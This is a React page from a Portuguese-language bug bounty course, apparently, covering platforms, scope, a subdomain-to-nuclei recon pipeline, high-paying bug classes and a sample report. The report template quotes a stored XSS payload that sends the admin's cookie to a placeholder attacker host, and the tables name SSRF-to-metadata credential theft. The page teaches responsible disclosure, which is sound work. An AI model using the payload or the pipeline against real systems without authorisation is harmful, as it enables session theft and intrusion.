import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function BugBounty() {
  return (
    <PageContainer
      title="Bug Bounty — caça profissional"
      subtitle="Plataformas, recon massivo, escolha de alvo, escrita de relatório aceito, programa de monetização."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>O que é bug bounty</h2>
      <p>
        Programas onde empresas pagam pesquisadores por vulnerabilidades reportadas com responsabilidade.
        Diferente de pentest contratado, você escolhe o alvo (dentro do escopo público), trabalha quando
        quer e ganha por bug aceito. Recompensas variam de US$ 50 (low) a US$ 100k+ (RCE crítico em alvo
        principal).
      </p>

      <h2>Plataformas principais</h2>
      <CommandTable
        title="Onde caçar"
        variations={[
          { cmd: "HackerOne (h1)", desc: "Maior plataforma. PayPal, Uber, Shopify, GitLab.", output: "hackerone.com" },
          { cmd: "Bugcrowd", desc: "2ª maior. Tesla, Mastercard, Atlassian.", output: "bugcrowd.com" },
          { cmd: "Intigriti", desc: "Forte na Europa.", output: "intigriti.com" },
          { cmd: "YesWeHack", desc: "Forte na França + EU.", output: "yeswehack.com" },
          { cmd: "Synack Red Team", desc: "Privado, precisa passar em teste técnico — paga MUITO mais.", output: "synack.com (convite)." },
          { cmd: "Programas próprios", desc: "Google VRP, Microsoft, Apple, Meta — fora de plataforma.", output: "Bounty maior, julgamento + lento." },
          { cmd: "Open Bug Bounty", desc: "Voluntário (sem $) só XSS.", output: "Para CV." },
        ]}
      />

      <h2>Fluxo de um relatório real</h2>
      <OutputBlock label="Da descoberta ao pagamento" type="muted">
{`1. Pesquisador descobre bug
2. Reporta no programa (form: título, descrição, PoC, impacto, severidade)
3. Triage do programa (1-7 dias) → New / Triaged / Duplicate / N-A / Spam
4. Triaged → time de segurança valida (1-30 dias)
5. Confirmado → pagamento + ack público (geralmente)
6. Fix em produção (semanas)
7. Disclosure pública (após 30-90 dias) — opcional

Status comuns:
  New              recém-reportado
  Triaged          analista confirmou que é válido
  Duplicate        outro pesquisador reportou primeiro
  Informative      é interessante mas não bug
  Resolved         foi corrigido + pago
  Not-Applicable   fora de escopo / sem impacto
  Spam             penalty no rep`}
      </OutputBlock>

      <h2>Escolher escopo</h2>
      <CommandTable
        title="In-scope vs out-of-scope (LEIA SEMPRE!)"
        variations={[
          { cmd: "*.target.com", desc: "Wildcard = todos os subdomínios.", output: "Onde a maioria dos bugs estão." },
          { cmd: "iOS / Android app", desc: "Geralmente in-scope.", output: "Use mobsf, frida, burp." },
          { cmd: "API endpoints", desc: "api.target.com, especificado.", output: "Espaço gigante para IDOR." },
          { cmd: "DNS / SSL / DKIM", desc: "Geralmente out (já automatizado).", output: "Só vale se for crítico." },
          { cmd: "DDoS / brute force massivo", desc: "SEMPRE out-of-scope.", output: "Pode banir + ação legal." },
          { cmd: "Engenharia social", desc: "Quase sempre out.", output: "Phishing/SE de funcionários proibido." },
          { cmd: "*.target-corporativo.com", desc: "MUITO comum estar OUT mesmo sendo do mesmo grupo.", output: "Conferir 2x." },
          { cmd: "3rd party (gravatar, intercom)", desc: "Out — não é deles.", output: "Reporte lá direto." },
        ]}
      />

      <h2>Stack de ferramentas (recon massivo)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "instalar tudo do projectdiscovery (pesquisador é go-heavy)",
            cmd: "go install -v github.com/projectdiscovery/{subfinder,httpx,nuclei,naabu,katana,dnsx}/v2/cmd/...@latest",
            out: `subfinder v2.6.6  → ~/go/bin/subfinder
httpx v1.6.9      → ~/go/bin/httpx
nuclei v3.3.0     → ~/go/bin/nuclei
naabu v2.3.1      → ~/go/bin/naabu
katana v1.1.0     → ~/go/bin/katana
dnsx v1.2.1       → ~/go/bin/dnsx`,
            outType: "success",
          },
          {
            cmd: "echo \"export PATH=\\$PATH:~/go/bin\" >> ~/.zshrc && source ~/.zshrc",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>Pipeline de recon (10 min)</h2>
      <Terminal
        path="~/bb"
        lines={[
          {
            comment: "1) subfinder + crt.sh + amass passivo",
            cmd: "subfinder -d empresa.com -all -silent | tee subs_raw.txt",
            out: `api.empresa.com
admin.empresa.com
backup.empresa.com
[...]
1.487 subdomínios`,
            outType: "info",
          },
          {
            cmd: "cat subs_raw.txt | dnsx -silent -a -resp | tee resolvidos.txt",
            out: `api.empresa.com [203.0.113.5]
admin.empresa.com [203.0.113.6]
[...]
624 resolvem`,
            outType: "default",
          },
          {
            comment: "2) port scan rápido (top 1000 + comum)",
            cmd: "cat resolvidos.txt | awk '{print $1}' | naabu -silent -top-ports 100 -o portas.txt",
            out: `api.empresa.com:443
api.empresa.com:8443
admin.empresa.com:80
admin.empresa.com:443
backup.empresa.com:21       ← FTP!
backup.empresa.com:8080
[...]`,
            outType: "warning",
          },
          {
            comment: "3) HTTP probe + título + tech stack",
            cmd: "cat portas.txt | httpx -silent -title -tech-detect -status-code -o vivos.txt",
            out: `https://api.empresa.com:443       [200] [API v3] [Express, Node.js]
https://admin.empresa.com:443     [401] [Login] [PHP 7.4, Apache 2.4]
http://backup.empresa.com:8080    [200] [Index of /backups] [nginx 1.14]   ← directory listing!
https://homolog.empresa.com:443   [200] [Staging] [WordPress 6.2]          ← versão antiga!`,
            outType: "warning",
          },
          {
            comment: "4) crawl + endpoints",
            cmd: "katana -u https://api.empresa.com -silent -depth 3 -jc -o endpoints.txt",
            out: `https://api.empresa.com/v3/users
https://api.empresa.com/v3/users/{id}
https://api.empresa.com/v3/admin/export
https://api.empresa.com/v3/internal/health
[...]
142 endpoints únicos`,
            outType: "info",
          },
          {
            comment: "5) nuclei contra TUDO — 9000+ templates",
            cmd: "cat vivos.txt | awk '{print $1}' | nuclei -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high,medium",
            out: `[git-config]      [http] [low]      http://backup.empresa.com:8080/.git/config
[ds-store]        [http] [low]      http://backup.empresa.com:8080/.DS_Store
[swagger-api]     [http] [info]     https://api.empresa.com/swagger.json
[wp-version]      [http] [info]     https://homolog.empresa.com/        WordPress 6.2.1
[CVE-2023-XXXX]   [http] [critical] https://homolog.empresa.com/wp-content/plugins/[X]   ← BUG!
[CVE-2024-YYYY]   [http] [high]     https://api.empresa.com/internal/health             ← exposto!`,
            outType: "error",
          },
        ]}
      />

      <h2>Bugs mais pagos (e onde achar)</h2>
      <CommandTable
        title="Tier S — paga US$ 5k+ na maioria"
        variations={[
          { cmd: "RCE", desc: "Exec código no server.", output: "Path traversal + upload, deserialization, SSRF→cloud metadata, log4j." },
          { cmd: "SQLi (quando ainda existe)", desc: "Injeção em query.", output: "Procure em endpoints novos, params não óbvios (sort, filter)." },
          { cmd: "Auth bypass", desc: "Pular autenticação.", output: "JWT none, OAuth state, race conditions." },
          { cmd: "IDOR em dados sensíveis", desc: "Acessar dados de outro user.", output: "API REST: trocar /users/123 por /users/124." },
          { cmd: "SSRF para metadata cloud", desc: "Server faz request para 169.254.169.254.", output: "Pega creds AWS/GCP." },
          { cmd: "XXE", desc: "XML externo entity.", output: "Sumiu mas ainda em apps Java legados." },
          { cmd: "Subdomain takeover", desc: "CNAME para serviço deletado.", output: "S3, Heroku, GH Pages, Azure." },
        ]}
      />

      <CommandTable
        title="Tier A — US$ 500-5000"
        variations={[
          { cmd: "Stored XSS", desc: "JS persiste no banco.", output: "Em campo enviado por user, renderizado em painel admin." },
          { cmd: "CSRF em ação crítica", desc: "Mudar senha, transferir, deletar.", output: "Sem token, sem SameSite." },
          { cmd: "Race condition", desc: "Compra 2x com 1 cupom.", output: "Threading: turbo-intruder do Burp." },
          { cmd: "Information disclosure (sensível)", desc: ".git, backups, env vars, credenciais.", output: "Nuclei + custom wordlist." },
          { cmd: "GraphQL introspection + IDOR", desc: "Query exposta + sem auth.", output: "Bem comum em APIs novas." },
          { cmd: "OAuth redirect URI bypass", desc: "Atacante recebe code/token.", output: "Param mal validado." },
        ]}
      />

      <h2>Anatomia de um relatório aceito</h2>
      <CodeBlock
        language="markdown"
        title="report.md (estrutura padrão)"
        code={`# [TÍTULO CURTO E PRECISO]
Ex: Stored XSS em /v3/users/profile via campo "bio" pode roubar sessão de admin

## Severidade
**Critical / High / Medium / Low / Info**
CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N → 8.7 (High)

## Resumo (1-2 frases)
O endpoint POST /api/v3/users/profile aceita HTML/JS no campo "bio" sem sanitização.
Um atacante autenticado pode armazenar payload XSS que executa quando admin abre 
/admin/users/{id}, permitindo roubo de cookie de sessão de administrador.

## Passos para reproduzir
1. Login como user comum em https://app.alvo.com
2. PUT /api/v3/users/profile com body:
   \`\`\`json
   { "bio": "<img src=x onerror='fetch(\\"https://atacante/?c=\\"+document.cookie)'>" }
   \`\`\`
3. Aguardar admin abrir /admin/users/{seu_id}
4. Receber cookie do admin no servidor atacante

## PoC (cURL)
\`\`\`bash
curl -X PUT https://app.alvo.com/api/v3/users/profile \\
  -H "Cookie: PHPSESSID=...." \\
  -H "Content-Type: application/json" \\
  -d '{"bio":"<img src=x onerror=alert(document.domain)>"}'
\`\`\`

## Evidências
[screenshot_1.png — payload no banco]
[screenshot_2.png — alert na sessão admin]
[network_log.har — request com cookie roubado]

## Impacto
- Roubo de sessão de admin → acesso completo ao painel
- ATO de qualquer user (admin → trocar email/senha)
- Vazamento de PII de todos os users (admin tem read all)
- Persistência (payload fica no banco)

## Sugestão de fix
1. Sanitizar campo bio com DOMPurify ou similar antes de armazenar
2. Output encoding ao renderizar (já que admin panel é HTML)
3. CSP estrito: \`Content-Security-Policy: script-src 'self'\`
4. HttpOnly cookie para sessão`}
      />

      <h2>O que NUNCA fazer</h2>
      <AlertBox type="danger" title="Penalidades reais">
        <ul className="m-0">
          <li><strong>Acessar dados de usuários reais</strong> — pare no PoC, não enumere.</li>
          <li><strong>DoS / brute force massivo</strong> — derruba alvo, banimento + acionamento legal.</li>
          <li><strong>Reportar antes de validar</strong> — N-A baixa sua reputação.</li>
          <li><strong>Pedir bounty antes do triage</strong> — mostra amadorismo.</li>
          <li><strong>Disclosure pública sem permissão</strong> — quebra Terms, banimento permanente.</li>
          <li><strong>Submeter duplicate sem checar</strong> — também baixa reputação.</li>
        </ul>
      </AlertBox>

      <h2>Como evitar duplicate</h2>
      <CommandTable
        title="Filtros para escolher alvo"
        variations={[
          { cmd: "Programa novo (< 6 meses)", desc: "Menos pesquisadores já passaram.", output: "Veja '_added_at' no h1." },
          { cmd: "Subdomínio menos óbvio", desc: "*.dev, *.staging, *.api-v3.", output: "main.alvo.com já foi torrado." },
          { cmd: "Funcionalidade recém lançada", desc: "Veja changelog público / blog.", output: "Bug em feature de 3 dias = 0 dups." },
          { cmd: "Mobile app", desc: "Menos pesquisador.", output: "Decompile com jadx, vê API endpoints internos." },
          { cmd: "Wildcard em escopo", desc: "*.alvo.com vs alvo.com.", output: "Sub random achado por subfinder." },
          { cmd: "API GraphQL", desc: "Introspection + IDOR.", output: "Mais novo que REST." },
        ]}
      />

      <h2>Profissionalização</h2>
      <OutputBlock label="Métricas que importam" type="info">
{`Reputation        — escala da plataforma. Top 100 = convite Synack.
Signal/Noise      — % de reports válidos. < 4 = banido.
Average bounty    — US$ por report aceito. Top hunters: 5k+.
Time to bounty    — quão rápido você é triado/pago.

Top hunters do BR (h1, públicos):
  - rhynorater (1.5M total)
  - hisxo (700k+)
  - inhibitor181 (UK mas BR no h1)

Como crescer:
  1. Foco em 1-2 programas, vire especialista neles
  2. Custom recon (não só nuclei genérico)
  3. Leia disclosed reports do programa todo dia
  4. Faça 1 RCE por mês > 100 XSS de baixo
  5. Rede com outros (Twitter/X, infosec community)`}
      </OutputBlock>

      <PracticeBox
        title="Recon completo do seu domínio"
        goal="Praticar pipeline em alvo legal (seu domínio ou hackerone.com — público)."
        steps={[
          "Defina target=hackerone.com",
          "Subfinder → DNS check → naabu → httpx → katana → nuclei.",
          "Documente 5 informações 'curiosas' (subdomain, tech, endpoint).",
          "NÃO REPORTE — é só prática.",
        ]}
        command={`TGT="hackerone.com"
mkdir -p ~/bb/$TGT && cd ~/bb/$TGT

subfinder -d $TGT -all -silent | dnsx -silent -a -resp -o resolved.txt
awk '{print $1}' resolved.txt | naabu -silent -top-ports 100 -o ports.txt
cat ports.txt | httpx -silent -title -tech-detect -sc -o live.txt
katana -u https://$TGT -silent -depth 2 -jc -o crawl.txt
cat live.txt | awk '{print $1}' | nuclei -silent -severity info,low,medium

wc -l resolved.txt ports.txt live.txt crawl.txt`}
        expected={`(exemplo)
  87 resolved.txt
 142 ports.txt
  76 live.txt
2841 crawl.txt`}
        verify="Compare com o resultado de outras pessoas — se número parecido, seu pipeline está afinado."
      />

      <AlertBox type="info" title="Comece em programas educacionais">
        Antes do dinheiro: <strong>HackerOne CTF</strong> (h1-ctf), <strong>PortSwigger Academy</strong>,
        <strong> PentesterLab Pro</strong>, <strong>Bugcrowd University</strong>. Faça os labs até
        seus dedos pegarem reflexo. Só depois entre em programa real.
      </AlertBox>
    </PageContainer>
  );
}
